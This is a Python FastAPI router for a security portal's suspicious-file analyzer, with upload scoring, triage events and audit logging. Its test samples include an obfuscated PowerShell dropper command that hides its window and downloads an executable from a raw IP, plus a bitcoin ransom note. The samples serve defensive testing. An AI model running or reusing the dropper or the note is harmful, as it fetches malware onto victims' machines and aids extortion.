import json
from datetime import datetime, timezone
from typing import Optional
from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Body
from sqlalchemy.orm import Session
from app.database import get_db
from app.models import ThreatAnalysis, SecurityEvent, AuditLog
from app.schemas import FileAnalysisResponse
from app.services.file_analyzer import file_analyzer, MAX_FILE_SIZE

router = APIRouter(prefix="/files", tags=["Suspicious File Analysis"])

@router.post("/analyze", response_model=FileAnalysisResponse)
async def analyze_uploaded_file(file: UploadFile = File(...), db: Session = Depends(get_db)):
    try:
        content = await file.read()
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Failed to read uploaded file: {str(e)}")

    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File exceeds maximum size threshold ({MAX_FILE_SIZE // (1024*1024)}MB).")

    try:
        result = file_analyzer.analyze_file_bytes(filename=file.filename or "unknown_upload.bin", content=content)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Analysis engine error: {str(e)}")

    # Persist ThreatAnalysis record
    threat_record = ThreatAnalysis(
        analysis_id=result.analysis_id,
        timestamp=datetime.now(timezone.utc),
        analysis_type="file",
        target_input=result.filename,
        risk_score=result.risk_score,
        risk_category=result.risk_category,
        detection_engine=result.detection_engine,
        indicators=json.dumps(result.suspicious_patterns),
        explanation=result.explanation,
        recommended_precautions=json.dumps(result.recommended_precautions),
        metadata_json=json.dumps({
            "sha256": result.sha256,
            "sha1": result.sha1,
            "md5": result.md5,
            "entropy": result.entropy,
            "filesize_bytes": result.filesize_bytes,
            "mime_type": result.mime_type
        })
    )
    db.add(threat_record)

    # If high or critical risk, add SecurityEvent to SOC triage feed
    if result.risk_score >= 50:
        event_obj = SecurityEvent(
            event_id=f"SEC-FILE-{int(datetime.now(timezone.utc).timestamp()) % 100000}",
            timestamp=datetime.now(timezone.utc),
            event_source="Endpoint File Analyzer",
            threat_category=f"Malicious File / {result.risk_category}",
            risk_score=result.risk_score,
            severity=result.risk_category,
            source_ip=None,
            dest_ip=None,
            domain=None,
            file_hash=result.sha256,
            user_account=None,
            evidence=f"File '{result.filename}' flagged. Entropy: {result.entropy}. Signatures: {', '.join(result.suspicious_patterns[:2])}",
            analysis_status="Analyzed",
            recommended_action=result.recommended_precautions[0] if result.recommended_precautions else "Quarantine artifact"
        )
        db.add(event_obj)

    audit = AuditLog(
        action="FILE_ANALYZED",
        actor="SOC Analyst / Portal User",
        resource_type="ThreatAnalysis",
        resource_id=result.analysis_id,
        details=f"Analyzed static artifact '{result.filename}' (SHA256: {result.sha256[:16]}...). Risk: {result.risk_score} ({result.risk_category})."
    )
    db.add(audit)
    db.commit()

    return result

@router.post("/sample-test", response_model=FileAnalysisResponse)
def analyze_sample_file(sample_type: str = Body(..., embed=True), db: Session = Depends(get_db)):
    samples = {
        "powershell_dropper": (
            "invoice_downloader.ps1",
            b"# Ingestion script\npowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aQBmACAAKAAkAHAAcwApAHsAIAB3AGcAZQB0ACAnaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUAbQBvAHIAZQAuAGUAeABlACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAGMAYQBjAGgAZQAuAGUAeABlACcAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfQA="
        ),
        "ransom_extortion": (
            "RESTORE_FILES_README.txt",
            b"ATTENTION! YOUR_FILES_ARE_ENCRYPTED with strong military grade RSA-4096. To restore your data, purchase 0.5 bitcoin and visit our decrypt_notes portal at http://ransom-support-recovery.top/ticket."
        ),
        "benign_report": (
            "Q3_Financial_Quarterly_Audit.pdf",
            b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000010 00000 n\n0000000059 00000 n\n0000000116 00000 n\ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n185\n%%EOF"
        ),
        "high_entropy_packed": (
            "firmware_update.bin",
            bytes([((i * 137 + 73) ^ (i % 251)) & 0xFF for i in range(4096)])  # Pseudo-random pseudo-encrypted bytes
        )
    }

    if sample_type not in samples:
        raise HTTPException(status_code=400, detail=f"Unknown sample type '{sample_type}'. Allowed: {list(samples.keys())}")

    fname, content = samples[sample_type]
    result = file_analyzer.analyze_file_bytes(filename=fname, content=content)

    threat_record = ThreatAnalysis(
        analysis_id=result.analysis_id,
        timestamp=datetime.now(timezone.utc),
        analysis_type="file",
        target_input=result.filename,
        risk_score=result.risk_score,
        risk_category=result.risk_category,
        detection_engine=result.detection_engine,
        indicators=json.dumps(result.suspicious_patterns),
        explanation=result.explanation,
        recommended_precautions=json.dumps(result.recommended_precautions),
        metadata_json=json.dumps({
            "sha256": result.sha256,
            "entropy": result.entropy,
            "sample_scenario": sample_type
        })
    )
    db.add(threat_record)
    db.commit()

    return result

@router.get("/samples")
def get_sample_file_scenarios():
    return [
        {
            "id": "powershell_dropper",
            "name": "invoice_downloader.ps1",
            "threat_label": "Obfuscated PowerShell Script Dropper",
            "expected_risk": "High",
            "description": "Script leveraging -ExecutionPolicy Bypass and encoded payload downloading secondary stage."
        },
        {
            "id": "ransom_extortion",
            "name": "RESTORE_FILES_README.txt",
            "threat_label": "Ransomware Extortion & Decrypt Note",
            "expected_risk": "Critical",
            "description": "Text artifact matching classic extortion demand templates and bitcoin ransom instructions."
        },
        {
            "id": "high_entropy_packed",
            "name": "firmware_update.bin",
            "threat_label": "High-Entropy Packed Binary Artifact",
            "expected_risk": "Medium",
            "description": "Binary payload exhibiting 7.9+ Shannon entropy indicating cryptographic packing."
        },
        {
            "id": "benign_report",
            "name": "Q3_Financial_Quarterly_Audit.pdf",
            "threat_label": "Benign Corporate PDF Document",
            "expected_risk": "Low",
            "description": "Standard PDF file structure without suspicious embedded macros or command sequences."
        }
    ]
